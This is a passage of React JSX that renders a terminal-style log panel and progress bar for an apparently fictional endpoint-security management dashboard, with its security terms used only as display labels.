                <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#22c55e' }} />
              </div>
              <span style={{ fontSize: '0.58rem', fontFamily: 'monospace', color: '#64748b' }}>
                {`edr_orchestrator_node@posturepilot: ~`}
              </span>
            </div>

            {isSyncing && (
              <div style={{ marginBottom: '0.5rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.6rem', color: '#a78bfa', fontFamily: 'monospace', marginBottom: 2 }}>
                  <span>EDR FLEET ORCHESTRATION SHIELD INJECTING:</span>
                  <span>{syncProgress}%</span>
                </div>
                <div style={{ height: 8, background: '#1e293b', borderRadius: 99, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${syncProgress}%`, background: '#7c3aed', transition: 'width 0.3s ease' }} />
                </div>
              </div>
            )}

            <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.72rem', color: '#c084fc', display: 'flex', flexDirection: 'column', gap: 4 }}>
              {syncLogs.length === 0 ? (
                <div style={{ color: '#475569', fontStyle: 'italic', margin: 'auto', textAlign: 'center', fontSize: '0.74rem' }}>
                  EDR heartbeats active. Swap agent modes, quarantine VMs, kill suspicious PIDs,<br/>or deploy hot-patches to stream boundary orchestration logs...
                </div>
              ) : (
                syncLogs.map((log, i) => (
                  <div key={i} style={{ color: log.includes('HEARTBEAT') || log.includes('COMPLETE') ? '#34d399' : log.includes('COMPLETE') ? '#34d399' : '#a78bfa', whiteSpace: 'pre-wrap' }}>
                    {log}
                  </div>
                ))
              )}
            </div>
          </div>

        </div>

      </div>
    </>
  );
}
